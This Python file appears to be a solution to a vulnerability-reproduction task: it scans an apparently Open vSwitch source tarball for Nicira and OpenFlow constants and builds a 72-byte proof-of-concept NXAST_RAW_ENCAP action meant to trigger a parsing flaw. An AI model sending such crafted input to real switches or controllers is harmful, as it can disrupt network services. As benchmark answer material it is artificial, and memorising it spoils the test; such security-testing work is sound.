import io
import os
import re
import tarfile
import struct
from typing import Dict, Optional, Tuple


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _parse_int_literal(expr: str) -> Optional[int]:
    if expr is None:
        return None
    e = expr.strip()
    if not e:
        return None
    while True:
        e2 = e.strip()
        if e2.startswith("(") and e2.endswith(")"):
            inner = e2[1:-1].strip()
            if inner and inner.count("(") == inner.count(")"):
                e = inner
                continue
        break
    e = e.strip()
    e = re.sub(r"\b([uUlL]+)\b", "", e)
    e = re.sub(r"(?<=\w)[uUlL]+$", "", e)
    e = e.strip()
    if re.fullmatch(r"[+-]?\d+", e):
        try:
            return int(e, 10)
        except Exception:
            return None
    if re.fullmatch(r"[+-]?0[xX][0-9a-fA-F]+", e):
        try:
            return int(e, 16)
        except Exception:
            return None
    return None


def _extract_define(text: str, name: str) -> Optional[int]:
    # Match both "#define NAME value" and "# define NAME value"
    m = re.search(r"(?m)^\s*#\s*define\s+" + re.escape(name) + r"\s+(.+?)\s*(?:$|/\*|//)", text)
    if not m:
        return None
    val = m.group(1).strip()
    val = _strip_c_comments(val).strip()
    # Handle simple parenthesized constants and casts.
    val = re.sub(r"^\(\s*(?:[a-zA-Z_]\w*\s*\*?\s*)\)\s*", "", val).strip()
    return _parse_int_literal(val)


def _find_enum_block(text: str, enum_name: str) -> Optional[str]:
    # Locate "enum enum_name { ... }"
    m = re.search(r"\benum\s+" + re.escape(enum_name) + r"\b", text)
    if not m:
        return None
    idx = m.end()
    brace = text.find("{", idx)
    if brace < 0:
        return None
    i = brace
    depth = 0
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return text[brace + 1 : i]
        i += 1
    return None


def _parse_enum(text: str, enum_name: str) -> Dict[str, int]:
    block = _find_enum_block(text, enum_name)
    if block is None:
        return {}
    block = _strip_c_comments(block)
    # Remove preprocessor lines.
    block = re.sub(r"(?m)^\s*#.*?$", "", block)
    parts = [p.strip() for p in block.split(",")]
    out: Dict[str, int] = {}
    cur = -1
    for p in parts:
        if not p:
            continue
        # Remove attributes, pragmas, etc.
        p = re.sub(r"__attribute__\s*\(\(.*?\)\)", "", p).strip()
        if not p:
            continue
        if "=" in p:
            name, expr = p.split("=", 1)
            name = name.strip()
            expr = expr.strip()
            val = _parse_int_literal(expr)
            if val is None:
                continue
            cur = val
            out[name] = val
        else:
            name = p.strip()
            if not re.fullmatch(r"[A-Za-z_]\w*", name):
                continue
            cur += 1
            out[name] = cur
    return out


def _extract_symbol_assignment(text: str, symbol: str) -> Optional[int]:
    # Try explicit "SYMBOL = value" wherever it appears (usually in enum lists).
    for m in re.finditer(r"\b" + re.escape(symbol) + r"\b\s*=\s*([^,}]+)", text):
        expr = _strip_c_comments(m.group(1)).strip()
        v = _parse_int_literal(expr)
        if v is not None:
            return v
    return None


class Solution:
    def _scan_tar_for_constants(self, src_path: str) -> Tuple[Optional[int], Optional[int], Optional[int], Optional[int]]:
        nx_vendor_id = None
        nxast_raw_encap = None
        ofpedpt_eth = None
        ofpedpt_ipv4 = None

        candidate_enum_names = ["nx_action_subtype", "ofp_ed_prop_type"]

        def try_extract_from_text(t: str) -> None:
            nonlocal nx_vendor_id, nxast_raw_encap, ofpedpt_eth, ofpedpt_ipv4

            if nx_vendor_id is None and "NX_VENDOR_ID" in t:
                v = _extract_define(t, "NX_VENDOR_ID")
                if v is not None:
                    nx_vendor_id = v

            if nxast_raw_encap is None and "NXAST_RAW_ENCAP" in t:
                v = _extract_symbol_assignment(t, "NXAST_RAW_ENCAP")
                if v is not None:
                    nxast_raw_encap = v

            if (ofpedpt_eth is None) and ("OFPEDPT_" in t):
                for sym in ("OFPEDPT_ETHERNET", "OFPEDPT_ETH"):
                    if sym in t:
                        v = _extract_symbol_assignment(t, sym)
                        if v is not None:
                            ofpedpt_eth = v
                            break

            if ofpedpt_ipv4 is None and "OFPEDPT_IPV4" in t:
                v = _extract_symbol_assignment(t, "OFPEDPT_IPV4")
                if v is not None:
                    ofpedpt_ipv4 = v

            # If not explicitly assigned, parse enums
            if ("enum" in t) and (("nx_action_subtype" in t) or ("ofp_ed_prop_type" in t)):
                for en in candidate_enum_names:
                    if en in t:
                        d = _parse_enum(t, en)
                        if nxast_raw_encap is None and "NXAST_RAW_ENCAP" in d:
                            nxast_raw_encap = d["NXAST_RAW_ENCAP"]
                        if ofpedpt_eth is None:
                            if "OFPEDPT_ETHERNET" in d:
                                ofpedpt_eth = d["OFPEDPT_ETHERNET"]
                            elif "OFPEDPT_ETH" in d:
                                ofpedpt_eth = d["OFPEDPT_ETH"]
                        if ofpedpt_ipv4 is None and "OFPEDPT_IPV4" in d:
                            ofpedpt_ipv4 = d["OFPEDPT_IPV4"]

        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            # Prefer likely files first.
            prioritized = []
            others = []
            for m in members:
                if not m.isfile():
                    continue
                name = m.name
                base = os.path.basename(name).lower()
                if any(k in base for k in ("nicira", "nx-match", "openflow", "ofp-actions")) and (base.endswith(".h") or base.endswith(".c")):
                    prioritized.append(m)
                elif base.endswith(".h") or base.endswith(".c"):
                    others.append(m)

            for m in prioritized + others:
                if nx_vendor_id is not None and nxast_raw_encap is not None and ofpedpt_eth is not None and ofpedpt_ipv4 is not None:
                    break
                if m.size <= 0 or m.size > 8_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if not text:
                    continue
                if ("NX_VENDOR_ID" not in text and "NXAST_RAW_ENCAP" not in text and "OFPEDPT_" not in text and "enum" not in text):
                    continue
                try_extract_from_text(text)

        return nx_vendor_id, nxast_raw_encap, ofpedpt_eth, ofpedpt_ipv4

    def solve(self, src_path: str) -> bytes:
        nx_vendor_id, nxast_raw_encap, ofpedpt_eth, ofpedpt_ipv4 = self._scan_tar_for_constants(src_path)

        if nx_vendor_id is None:
            nx_vendor_id = 0x00002320

        if ofpedpt_eth is None:
            # OpenFlow 1.5 ED property types: Ethernet commonly 0
            ofpedpt_eth = 0

        if ofpedpt_ipv4 is None:
            # OpenFlow 1.5 ED property types: IPv4 commonly 4
            ofpedpt_ipv4 = 4

        if nxast_raw_encap is None:
            # Best-effort fallback; actual value should be extracted from sources.
            nxast_raw_encap = 57

        # Build NXAST_RAW_ENCAP experimenter action with ED properties (Ethernet + IPv4)
        # Total length: 72 bytes (multiple of 8)
        ofpat_experimenter = 0xFFFF
        action_len = 72

        # Nicira extended action header (16 bytes)
        hdr = struct.pack("!HHIH6s", ofpat_experimenter, action_len, nx_vendor_id & 0xFFFFFFFF, nxast_raw_encap & 0xFFFF, b"\x00" * 6)

        # Assume 4-byte packet_type + 4 bytes pad to align properties (8 bytes)
        packet_type = 0  # Ethernet (ns=0, type=0) in common usage
        fixed2 = struct.pack("!I4s", packet_type & 0xFFFFFFFF, b"\x00" * 4)

        # Ethernet ED property: header(4) + dst(6) + src(6) + eth_type(2) + pad(6) = 24
        eth_dst = b"\x11\x22\x33\x44\x55\x66"
        eth_src = b"\xaa\xbb\xcc\xdd\xee\xff"
        eth_type = 0x0800
        eth_prop = struct.pack("!HH", ofpedpt_eth & 0xFFFF, 24) + eth_dst + eth_src + struct.pack("!H", eth_type) + (b"\x00" * 6)

        # IPv4 ED property: header(4) + iphdr(20) = 24
        ver_ihl = 0x45
        tos = 0
        total_length = 20
        identification = 0
        frag_off = 0
        ttl = 64
        proto = 17  # UDP
        checksum = 0
        saddr = (1 << 24) | (2 << 16) | (3 << 8) | 4
        daddr = (5 << 24) | (6 << 16) | (7 << 8) | 8
        iphdr = struct.pack("!BBHHHBBHII", ver_ihl, tos, total_length, identification, frag_off, ttl, proto, checksum, saddr, daddr)
        ipv4_prop = struct.pack("!HH", ofpedpt_ipv4 & 0xFFFF, 24) + iphdr

        poc = hdr + fixed2 + eth_prop + ipv4_prop
        if len(poc) != action_len:
            # If assumptions differ, pad/truncate to keep deterministic and aligned
            if len(poc) < action_len:
                poc = poc + b"\x00" * (action_len - len(poc))
            else:
                poc = poc[:action_len]
        return poc